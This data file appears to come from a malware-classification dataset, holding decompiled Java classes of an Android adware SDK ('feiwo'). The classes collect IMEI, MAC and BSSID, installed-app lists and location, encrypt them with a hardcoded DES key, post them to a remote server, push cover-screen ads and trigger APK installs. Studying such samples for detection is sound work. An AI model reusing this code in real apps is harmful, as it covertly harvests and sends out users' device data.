"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\e.code","public final class e {   public static int a(  Context context,  String str,  String str2,  String str3,  int i){     return b(context,str,str2).optInt(str3,0);   }   public static String a(  Context context,  String str,  String str2,  String str3,  String str4){     String string=context.getSharedPreferences(str,0).getString(f.a(str2,str4,true),str3);     return string.equals(str3) ? str3 : f.a(string,""12345678"");   }   public static void a(  Context context,  String str,  String str2){     context.getSharedPreferences(""ADFEIWO"",0).edit().remove(f.a(str,str2,true)).commit();   }   public static void a(  Context context,  String str,  String str2,  int i,  String str3){     context.getSharedPreferences(str,0).edit().putInt(f.a(str2,str3,true),i).commit();   }   public static void a(  Context context,  String str,  String str2,  boolean z,  String str3){     context.getSharedPreferences(str,0).edit().putBoolean(f.a(str2,str3,true),z).commit();   }   public static JSONObject b(  Context context,  String str,  String str2){     try {       return new JSONObject(a(context,str,str2,""{}"",""12345678""));     }  catch (    UnsupportedEncodingException e) {       JSONObject jSONObject=new JSONObject();       a(context,str2,""12345678"");       return jSONObject;     } catch (    JSONException e2) {       JSONObject jSONObject2=new JSONObject();       a(context,str2,""12345678"");       return jSONObject2;     }   }   public static void b(  Context context,  String str,  String str2,  String str3,  String str4){     context.getSharedPreferences(str,0).edit().putString(f.a(str2,str4,true),f.a(str3,str4,true)).commit();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\f.code","public final class f {   public static String a(  String str){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(str.substring(0,4));     stringBuffer.append(str.substring(str.length() - 4));     return stringBuffer.toString();   }   public static String a(  String str,  String str2){     return new String(c(str,str2));   }   public static String a(  String str,  String str2,  boolean z){     return c.a(b(str,str2),z);   }   private static byte[] b(  String str,  String str2){     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES"");       Cipher cipher=Cipher.getInstance(""DES"");       byte[] bytes=str.getBytes(""utf-8"");       cipher.init(1,secretKeySpec);       return cipher.doFinal(bytes);     }  catch (    UnsupportedEncodingException|InvalidKeyException|NoSuchAlgorithmException|BadPaddingException|IllegalBlockSizeException|NoSuchPaddingException e) {       return null;     }   }   private static byte[] c(  String str,  String str2){     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES"");       Cipher cipher=Cipher.getInstance(""DES"");       byte[] a=c.a(str);       cipher.init(2,secretKeySpec);       return cipher.doFinal(a);     }  catch (    InvalidKeyException|NoSuchAlgorithmException|BadPaddingException|IllegalBlockSizeException|NoSuchPaddingException e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\g.code","public final class g {   public static Drawable a(  Context context,  String str){     try {       return Drawable.createFromStream(context.getAssets().open(str),str);     }  catch (    IOException e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\h.code","public final class h {   private static h a;   private HttpURLConnection b;   private h(){   }   public static final synchronized h a(){     h hVar; synchronized (h.class) {       if (a == null) {         a=new h();       }       hVar=a;     }     return hVar;   }   public final java.lang.String a(  android.content.Context r11,  java.lang.String r12,  java.lang.String r13,  java.lang.String r14){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwoone.banner.f.h.a(android.content.Context, java.lang.String, java.lang.String, java.lang.String):java.lang.String"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\i.code","public final class i {   private static i a;   private i(){   }   public static i a(){     if (a == null) {       a=new i();     }     return a;   }   public static String a(  Context context,  boolean z){     int i=0;     StringBuffer stringBuffer=new StringBuffer();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 >= installedPackages.size()) {         return stringBuffer.toString().substring(1);       }       PackageInfo packageInfo=installedPackages.get(i2);       if ((packageInfo.applicationInfo.flags & 1) == 0) {         stringBuffer.append("","");         stringBuffer.append(packageInfo.packageName);       }       i=i2 + 1;     }   }   public static boolean a(  Context context,  String str){     if (l.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\j.code","public final class j {   public static String a(){     try {       return l.a("""") ? Build.MANUFACTURER : """";     }  catch (    Exception e) {       return """";     }   }   public static String a(  Context context){     String str;     try {       str=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     }  catch (    Exception e) {       str=null;     }     if (l.a(str)) {       str=c(context);     }     if (!l.a(str)) {       return str;     }     String string=context.getSharedPreferences(""SAVE_IMEI"",0).getString(""UDID"",null);     if (!l.a(string)) {       return string;     }     String str2=String.valueOf(System.currentTimeMillis()) + l.a(3);     context.getSharedPreferences(""SAVE_IMEI"",0).edit().putString(""UDID"",str2).commit();     return str2;   }   public static com.feiwoone.banner.c.c b(  Context context){     com.feiwoone.banner.c.c cVar=new com.feiwoone.banner.c.c();     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     cVar.a(displayMetrics.widthPixels);     cVar.b(displayMetrics.heightPixels);     return cVar;   }   public static String b(){     try {       return l.a("""") ? Build.MODEL : """";     }  catch (    Exception e) {       return """";     }   }   public static String c(){     try {       return Build.VERSION.SDK;     }  catch (    Exception e) {       return """";     }   }   private static String c(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       return null;     }   }   public static String d(){     try {       return Build.VERSION.RELEASE;     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\k.code","public final class k {   public static String a(){     try {       return m.a("""") ? Build.MANUFACTURER : """";     }  catch (    Exception e) {       return """";     }   }   public static String a(  Context context){     String str;     try {       str=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     }  catch (    Exception e) {       str="""";     }     return m.a(str) ? b(context) : str;   }   public static String b(){     try {       return Build.VERSION.SDK;     }  catch (    Exception e) {       return """";     }   }   public static String b(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       return """";     }   }   public static String c(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo().getBSSID();     }  catch (    Exception e) {       return """";     }   }   public static com.feiwoone.banner.c.c d(  Context context){     com.feiwoone.banner.c.c cVar=new com.feiwoone.banner.c.c();     if (com.feiwoone.banner.b.a.b > 0 && com.feiwoone.banner.b.a.c > 0) {       cVar.a(com.feiwoone.banner.b.a.b);       cVar.b(com.feiwoone.banner.b.a.c);       return cVar;     }     try {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       cVar.a(displayMetrics.widthPixels);       cVar.b(displayMetrics.heightPixels);     }  catch (    Exception e) {     }     return cVar;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\l.code","public final class l {   public static String a(  int i){     String[] strArr={""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"",""0""};     Random random=new Random();     StringBuilder sb=new StringBuilder();     while (i > 0) {       sb.append(strArr[random.nextInt(10)]);       i--;     }     return sb.toString();   }   public static boolean a(  String str){     return str == null || str.length() == 0 || str.trim().length() == 0;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.f\m.code","public final class m {   public static boolean a(  String str){     int length;     if (str == null || (length=str.length()) == 0) {       return true;     }     for (int i=0; i < length; i++) {       if (!Character.isWhitespace(str.charAt(i))) {         return false;       }     }     return true;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.g\a.code","public final class a extends RelativeLayout {   private ImageView a;   public final void a(){   }   @Override public final void setOnClickListener(  View.OnClickListener onClickListener){     this.a.setOnClickListener(onClickListener);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\A.code","public final class A extends C0030s implements GestureDetector.OnGestureListener {   GestureDetector c;   ViewFlipper d;   int e;   private int f;   private int g;   private int h;   private int i;   private int j;   private int k;   private int l;   private int m;   private int n;   private int o;   private int p;   private int q;   private int r;   private int s;   private LinearLayout t;   public A(  SA sa,  List list,  int i){     super(sa,list);     this.f=1;     this.g=32;     this.h=this.g / 2;     this.i=275;     this.j=180;     this.k=5;     this.l=50;     this.m=50;     this.n=14;     this.o=96;     this.p=36;     this.q=this.i + this.g + (this.f << 1);     this.r=this.j + this.g + (this.f << 1)+ this.k+ this.m;     this.s=12;     this.e=0;     this.e=i;     this.c=new GestureDetector(sa,this);     b();   }   @Override public final int a(  View view,  Q q){     this.d.removeView(view);     this.e=super.a(view,q);     return this.e;   }   @Override protected final void c(){     this.f=an.a(getContext(),this.f);     this.g=an.a(getContext(),this.g);     this.q=an.a(getContext(),this.q);     this.r=an.a(getContext(),this.r);     this.h=an.a(getContext(),this.h);     this.i=an.a(getContext(),this.i);     this.j=an.a(getContext(),this.j);     this.k=an.a(getContext(),this.k);     this.l=an.a(getContext(),this.l);     this.m=an.a(getContext(),this.m);     this.p=an.a(getContext(),this.p);     this.o=an.a(getContext(),this.o);     this.s=an.a(getContext(),this.s);     Rect rect=new Rect();     this.a.getWindow().getDecorView().getWindowVisibleDisplayFrame(rect);     new StringBuilder().append(""initParam: [imageWidth: "").append(this.i).append("",imageHeight: "").append(this.j).append("",outContainerWidth: "").append(this.q).append("",outContainerHeight: "").append(this.r).append(""]"").append(rect);     int width=rect.width() - this.q;     new StringBuilder().append(""extraWidth: "").append(width).append("",frame.width: "").append(rect.width()).append("",outContainerWidth: "").append(this.q);     if (width < 0 || Math.abs(width) > 10) {       double height=(rect.height() - 10) / this.r;       double width2=(rect.width() - 10) / this.q;       if (height <= width2) {         width2=height;       }       double d=width2 <= 1.5d ? width2 : 1.5d;       this.f=(int)(this.f * d);       this.g=(int)(this.g * d);       this.q=(int)(this.q * d);       this.r=(int)(this.r * d);       this.h=(int)(this.h * d);       this.i=(int)(this.i * d);       this.j=(int)(this.j * d);       this.k=(int)(this.k * d);       this.l=(int)(this.l * d);       this.m=(int)(this.m * d);       this.p=(int)(this.p * d);       this.o=(int)(this.o * d);       this.n=(int)(this.n * d);       this.s=(int)(this.s * d);       new StringBuilder().append(""initParam: [rate: "").append(d).append("",imageWidth: "").append(this.i).append("",imageHeight: "").append(this.j).append("",outContainerWidth: "").append(this.q).append("",outContainerHeight: "").append(this.r).append(""]"");     }   }   @Override protected final void d(){     float a=an.a(getContext(),5.0f);     ShapeDrawable shapeDrawable=new ShapeDrawable(new RoundRectShape(new float[]{a,a,a,a,a,a,a,a},null,null));     shapeDrawable.setPadding(this.f,this.f,this.f,this.f);     shapeDrawable.getPaint().setColor(-1);     RelativeLayout relativeLayout=new RelativeLayout(getContext());     relativeLayout.setLayoutParams(new LinearLayout.LayoutParams(this.q,this.r));     addView(relativeLayout);     LinearLayout linearLayout=new LinearLayout(getContext());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.setMargins(this.h,this.h,this.h,this.h);     layoutParams.addRule(13,-1);     linearLayout.setLayoutParams(layoutParams);     linearLayout.setBackgroundDrawable(shapeDrawable);     linearLayout.setOrientation(1);     linearLayout.setGravity(17);     relativeLayout.addView(linearLayout);     ImageView imageView=new ImageView(getContext());     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(10,-1);     layoutParams2.addRule(11,-1);     int i=this.g;     layoutParams2.width=i;     layoutParams2.height=i;     imageView.setLayoutParams(layoutParams2);     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     getContext();     imageView.setImageDrawable(an.a(S.f));     relativeLayout.addView(imageView);     imageView.setOnClickListener(new ViewOnClickListenerC0031t(this));     this.d=new ViewFlipper(getContext());     this.d.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));     for (    Q q : this.b) {       LinearLayout linearLayout2=new LinearLayout(getContext());       linearLayout2.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));       linearLayout2.setOrientation(1);       ImageView imageView2=new ImageView(getContext());       imageView2.setLayoutParams(new LinearLayout.LayoutParams(this.i,this.j));       imageView2.setScaleType(ImageView.ScaleType.FIT_XY);       a(imageView2,q.b(),true);       linearLayout2.addView(imageView2);       LinearLayout linearLayout3=new LinearLayout(getContext());       LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);       layoutParams3.topMargin=this.k;       linearLayout3.setLayoutParams(layoutParams3);       linearLayout3.setOrientation(0);       linearLayout2.addView(linearLayout3);       ImageView imageView3=new ImageView(getContext());       imageView3.setLayoutParams(new LinearLayout.LayoutParams(this.l,this.m));       imageView3.setScaleType(ImageView.ScaleType.FIT_XY);       a(imageView3,q.j(),false);       linearLayout3.addView(imageView3);       LinearLayout linearLayout4=new LinearLayout(getContext());       LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(0,-1);       layoutParams4.leftMargin=an.a(getContext(),4.0f);       layoutParams4.weight=1.0f;       linearLayout4.setLayoutParams(layoutParams4);       linearLayout4.setGravity(16);       linearLayout4.setOrientation(1);       linearLayout3.addView(linearLayout4);       TextView textView=new TextView(getContext());       LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-2,-2);       if (Q.a.equals(q.h())) {         textView.setText(q.d());       }  else {         textView.setText(q.c());       }       textView.setTextColor(-16777216);       textView.setTextSize(this.n);       textView.setTypeface(Typeface.DEFAULT_BOLD);       textView.setLayoutParams(layoutParams5);       linearLayout4.addView(textView);       if (Q.a.equals(q.h())) {         TextView textView2=new TextView(getContext());         LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-2,-2);         layoutParams6.topMargin=an.a(getContext(),2.0f);         textView2.setText(q.l());         textView2.setTextColor(-16777216);         textView2.setTextSize(this.n - 2);         textView2.setLayoutParams(layoutParams6);         linearLayout4.addView(textView2);       }       ImageView imageView4=new ImageView(getContext());       LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(this.o,this.p);       layoutParams7.gravity=16;       imageView4.setLayoutParams(layoutParams7);       imageView4.setScaleType(ImageView.ScaleType.FIT_XY);       if (Q.a.equals(q.h())) {         getContext();         imageView4.setImageDrawable(an.a(S.g));       }  else {         getContext();         imageView4.setImageDrawable(an.a(S.h));       }       linearLayout3.addView(imageView4);       this.d.addView(linearLayout2);     }     linearLayout.addView(this.d);     this.t=new LinearLayout(getContext());     RelativeLayout.LayoutParams layoutParams8=new RelativeLayout.LayoutParams(-1,-2);     layoutParams8.addRule(12,-1);     layoutParams8.addRule(14,-1);     layoutParams8.bottomMargin=this.g;     this.t.setVisibility(8);     this.t.setLayoutParams(layoutParams8);     this.t.setGravity(1);     relativeLayout.addView(this.t);     if (this.e < 0 || this.e >= this.b.size()) {       this.e=0;     }     this.d.setDisplayedChild(this.e);     if (CPManager.getInstance() != null) {       CPManager.getInstance().a(this.e + 1);     }     a(this.e);     B b=new B(this,linearLayout);     Animation scaleAnimation=new ScaleAnimation(0.0f,1.0f,0.0f,1.0f,1,0.5f,1,0.5f);     scaleAnimation.setDuration(1000L);     scaleAnimation.setAnimationListener(new AnimationAnimationListenerC0035x(this,b,relativeLayout));     relativeLayout.startAnimation(scaleAnimation);   }   @Override public final void f(){     TranslateAnimation translateAnimation=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f);     translateAnimation.setDuration(500L);     TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f);     translateAnimation2.setDuration(500L);     this.d.setInAnimation(translateAnimation);     this.d.setOutAnimation(translateAnimation2);     this.d.showNext();     this.e++;     if (this.e >= this.b.size()) {       this.e=0;     }     if (CPManager.getInstance() != null) {       CPManager.getInstance().a(this.e + 1);     }     a(this.e);   }   @Override public final boolean onDown(  MotionEvent motionEvent){     g();     return false;   }   @Override public final boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     if (this.b.size() <= 1) {       return true;     }     if (motionEvent2.getX() - motionEvent.getX() > 120.0f) {       TranslateAnimation translateAnimation=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f);       translateAnimation.setDuration(500L);       TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f);       translateAnimation2.setDuration(500L);       this.d.setInAnimation(translateAnimation);       this.d.setOutAnimation(translateAnimation2);       this.d.showPrevious();       this.e--;       if (this.e < 0) {         this.e=this.b.size() - 1;       }       if (CPManager.getInstance() != null) {         CPManager.getInstance().a(this.e + 1);       }       a(this.e);     }  else     if (motionEvent2.getX() - motionEvent.getX() < -120.0f) {       f();     }     g();     return true;   }   @Override public final void onLongPress(  MotionEvent motionEvent){     g();   }   @Override public final boolean onScroll(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     g();     return false;   }   @Override public final void onShowPress(  MotionEvent motionEvent){     g();   }   @Override public final boolean onSingleTapUp(  MotionEvent motionEvent){     g();     if (this.e >= this.b.size()) {       f();     }  else {       b(this.d.getChildAt(this.e),(Q)this.b.get(this.e));     }     return true;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\aa.code","public interface aa {   void a(  boolean z,  String str); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ab.code","public final class ab implements Runnable {   private URL a=null;   private aa b;   private String c;   private String d;   private Context e;   public final void a(  Context context,  String str,  String str2,  String str3){     this.e=context;     this.c=str2;     this.d=str3;     try {       this.a=new URL(str);     }  catch (    MalformedURLException e) {       new StringBuilder().append("""").append(e);     }     new StringBuilder().append(""setBaseRequestInfo, url: "").append(str);   }   public final void a(  aa aaVar){     this.b=aaVar;   }   @Override public final void run(){     int b=P.b(this.e);     if (b == 0) {       return;     }     Context context=this.e;     new StringBuilder().append(""\nG_èŽ·å�–æ•°æ�®  > "").append(new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").format(new Date(System.currentTimeMillis())));     Context context2=this.e;     new StringBuilder().append(""\nG_JSON      "").append(this.d);     if (this.a == null) {       Context context3=this.e;       throw new IllegalArgumentException(""URL must be init!_feiwocp"".replace(""_feiwocp"",""""));     }     if (aq.a(this.c)) {       Context context4=this.e;       throw new IllegalArgumentException(""password must be init!_feiwocp"".replace(""_feiwocp"",""""));     }     HttpURLConnection httpURLConnection=null;     try {       try {         try {           try {             String defaultHost=Proxy.getDefaultHost();             int defaultPort=Proxy.getDefaultPort();             new StringBuilder().append(""proxyHost: "").append(defaultHost).append("", port: "").append(defaultPort);             HttpURLConnection httpURLConnection2=(2 != b || defaultHost == null || defaultPort <= 0) ? (HttpURLConnection)this.a.openConnection() : (HttpURLConnection)this.a.openConnection(new java.net.Proxy(Proxy.Type.HTTP,new InetSocketAddress(defaultHost,defaultPort)));             httpURLConnection2.setRequestMethod(""POST_feiwocp"".replace(""_feiwocp"",""""));             httpURLConnection2.setRequestProperty(""content-type"",""application/x-www-form-urlencoded_feiwocp"".replace(""_feiwocp"",""""));             httpURLConnection2.addRequestProperty(""appkey_feiwocp"".replace(""_feiwocp"",""""),this.c);             httpURLConnection2.setDoOutput(true);             httpURLConnection2.setConnectTimeout(60000);             httpURLConnection2.setReadTimeout(30000);             BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(httpURLConnection2.getOutputStream()));             bufferedWriter.write(R.a(this.d,R.a(this.c),false));             bufferedWriter.close();             int responseCode=httpURLConnection2.getResponseCode();             new StringBuilder().append(""get url response code: "").append(responseCode).append("", "").append(this.a);             BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(responseCode != 200 ? httpURLConnection2.getErrorStream() : httpURLConnection2.getInputStream()));             StringBuilder sb=new StringBuilder();             while (true) {               String readLine=bufferedReader.readLine();               if (readLine == null) {                 break;               }  else {                 sb.append(readLine);               }             }             bufferedReader.close();             if (responseCode == 200) {               this.b.a(true,R.a(sb.toString(),R.a(this.c)));             }  else {               this.b.a(false,R.a(sb.toString(),R.a(this.c)));             }             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }           }  catch (          Exception e) {             this.b.a(false,""Exception: _feiwocp"".replace(""_feiwocp"","""") + e);             Context context5=this.e;             new StringBuilder().append(""\nG_error Exception > "").append(e).append("" > "");             if (0 != 0) {               httpURLConnection.disconnect();             }           }         }  catch (        SocketTimeoutException e2) {           Context context6=this.e;           new StringBuilder().append(""\nG_error > SocketTimeoutException > "").append(e2).append("" > "");           this.b.a(false,""SocketTimeoutException _feiwocp"".replace(""_feiwocp"","""") + e2);           if (0 != 0) {             httpURLConnection.disconnect();           }         }       }  catch (      SocketException e3) {         Context context7=this.e;         new StringBuilder().append(""\nG_error SocketException > "").append(e3).append("" > "");         this.b.a(false,""SocketException _feiwocp"".replace(""_feiwocp"","""") + e3);         if (0 != 0) {           httpURLConnection.disconnect();         }       } catch (      IOException e4) {         Context context8=this.e;         new StringBuilder().append(""\nG_error IOException > "").append(e4).append("" > "");         this.b.a(false,""IOException: _feiwocp"".replace(""_feiwocp"","""") + e4);         if (0 != 0) {           httpURLConnection.disconnect();         }       }     }  catch (    Throwable th) {       if (0 != 0) {         httpURLConnection.disconnect();       }       throw th;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\AbstractC0012a.code","public abstract class AbstractC0012a {   static boolean a=false;   private String c;   private Context d;   private TimerTask g;   private Handler i;   boolean b=false;   private boolean e=false;   private int f=10;   private Timer h=new Timer();   public AbstractC0012a(  Context context,  String str){     this.i=null;     this.d=context;     this.c=str;     a=false;     ap.b(context,S.j,S.k,str);     ap.a(context,S.j,S.m,true);     try {       this.i=new Handler();     }  catch (    Exception e) {     }     try {       aj.a();     }  catch (    Exception e2) {     }     try {       P.c(context);     }  catch (    Exception e3) {     }     if (P.a(context) && P.a(this.d)) {       if (!this.e) {         Context context2=this.d;         a(true);       }       new C0013b(this).start();     }   }   public static void a(  AbstractC0012a abstractC0012a){     JSONObject a2=H.a(abstractC0012a.d,abstractC0012a.c,S.a);     ab abVar=new ab();     abVar.a(abstractC0012a.d,I.c(),abstractC0012a.c,a2.toString());     abVar.a(new C0015d(abstractC0012a));     Z.a().a(abVar);   }   public static void b(  AbstractC0012a abstractC0012a){     String a2=ap.a(abstractC0012a.d,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     if (a2 != null) {       String[] split=a2.split("","");       JSONArray jSONArray=new JSONArray();       for (      String str : split) {         if (!aq.a(str)) {           JSONObject jSONObject=new JSONObject();           try {             jSONObject.put(""packageName_feiwocp"".replace(""_feiwocp"",""""),str);           }  catch (          JSONException e) {           }           jSONArray.put(jSONObject);         }       }       if (jSONArray.length() != 0) {         JSONObject a3=H.a(abstractC0012a.d,S.a,jSONArray);         ab abVar=new ab();         abVar.a(abstractC0012a.d,I.d(),abstractC0012a.c,a3.toString());         abVar.a(new C0016e(abstractC0012a));         Z.a().a(abVar);       }     }   }   public static boolean isShowAtScreenOn(){     return a;   }   public void a(){     this.e=true;     if (this.g != null) {       this.g.cancel();       this.g=null;       this.h.cancel();     }   }   public final void a(  JSONArray jSONArray){     for (int i=0; i < jSONArray.length(); i++) {       String optString=jSONArray.optJSONObject(i).optString(""image_feiwocp"".replace(""_feiwocp"",""""));       if (!aq.a(optString)) {         this.i.postDelayed(new RunnableC0017f(this,optString),10L);       }       String optString2=jSONArray.optJSONObject(i).optString(""icon_feiwocp"".replace(""_feiwocp"",""""));       if (!aq.a(optString2)) {         this.i.postDelayed(new RunnableC0018g(this,optString2),10L);       }     }   }   public final void a(  boolean z){     if (z) {       this.f=10;     }  else {       this.f--;     }     if (this.f >= 0 && !this.e) {       if (z) {         if (this.g != null) {           this.g.cancel();           Context context=this.d;         }         b();         return;       }       if (this.g != null) {         Context context2=this.d;         return;       }       this.g=new C0014c(this);       this.h.schedule(this.g,360000L);       Context context3=this.d;     }   }   public final boolean a(  List list,  int i){     try {       Intent intent=new Intent(this.d,(Class<?>)SA.class);       intent.addFlags(335544320);       intent.putExtra(""itemList_feiwocp"".replace(""_feiwocp"",""""),(ArrayList)list);       intent.putExtra(""index_feiwocp"".replace(""_feiwocp"",""""),i);       if (this.i != null) {         this.i.post(new RunnableC0019h(this,intent));       }  else {         this.d.startActivity(intent);       }       return true;     }  catch (    Exception e) {       return false;     }   }   public abstract void b();   public void c(){     this.b=false;     this.g=null;   }   public final String d(){     return this.c;   }   public final Context e(){     return this.d;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ac.code","public final class ac {   private static ac c;   private double a=0.0d;   private double b=0.0d;   public ac(){     new ad(this);   }   public static ac c(){     if (c == null) {       c=new ac();     }     return c;   }   public final double a(){     return this.a;   }   public final double b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ad.code","public final class ad implements LocationListener {   private ac a;   public ad(  ac acVar){     this.a=acVar;   }   @Override public final void onLocationChanged(  Location location){     this.a.a=location.getLatitude();     this.a.b=location.getLongitude();   }   @Override public final void onProviderDisabled(  String str){   }   @Override public final void onProviderEnabled(  String str){   }   @Override public final void onStatusChanged(  String str,  int i,  Bundle bundle){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ae.code","public final class ae {   private static ae b=null;   private static Context c;   private NotificationManager a;   private ae(  Context context){     this.a=null;     if (this.a == null) {       this.a=(NotificationManager)context.getSystemService(""notification"");     }   }   private ImageView a(  View view){     if (!(view instanceof ViewGroup)) {       if (view instanceof ImageView) {         return (ImageView)view;       }       return null;     }     ViewGroup viewGroup=(ViewGroup)view;     for (int childCount=viewGroup.getChildCount(); childCount > 0; childCount--) {       ImageView a=a(viewGroup.getChildAt(childCount - 1));       if (a != null && a.getId() == 16908294) {         return a;       }     }     return null;   }   public static ae a(  Context context){     c=context;     if (b == null) {       b=new ae(c);     }     return b;   }   public final void a(  int i){     this.a.cancel(i);   }   public final void a(  int i,  int i2,  String str,  String str2,  String str3,  Intent intent,  int i3,  String str4,  long j){     Notification notification=new Notification();     notification.icon=android.R.drawable.ic_menu_share;     notification.tickerText=str;     notification.flags=i3;     notification.when=j;     notification.setLatestEventInfo(c,str2,str3,PendingIntent.getActivity(c,0,intent,134217728));     if (str4 == null || str4.length() == 0 || notification == null) {       return;     }     try {       ImageView a=a(View.inflate(c,notification.contentView.getLayoutId(),null));       Y.a();       Bitmap a2=K.a().a(c,Y.a(c,S.d,str4));       if (a2 != null) {         notification.contentView.setImageViewBitmap(a.getId(),a2);       }       this.a.notify(i,notification);     }  catch (    Exception e) {       new StringBuilder().append(""NotificationManagerTool >> "").append(e.getMessage());     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\af.code","public final class af {   private static final String a=""NumberUtil.java_feiwocp"".replace(""_feiwocp"","""");   public static int a(  String str,  int i){     if (str == null || str.equals("""")) {       return 0;     }     try {       return Integer.parseInt(str.trim());     }  catch (    NumberFormatException e) {       Log.w(a,""errorMessage > "" + e);       return 0;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\ag.code","public final class ag {   private static ag a=null;   private ag(){   }   public static ag a(){     if (a == null) {       a=new ag();     }     return a;   }   public static void a(  Context context,  String str){     if (aq.a(str)) {       return;     }     File file=new File(str);     Intent intent=new Intent();     intent.addFlags(272629760);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     context.startActivity(intent);   }   public static void b(  Context context,  String str){     if (aq.a(str)) {       return;     }     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent();     try {       intent=packageManager.getLaunchIntentForPackage(str);     }  catch (    ActivityNotFoundException e) {     }     context.startActivity(intent);   }   public static boolean c(  Context context,  String str){     if (aq.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    Exception e) {       return false;     }   } } "
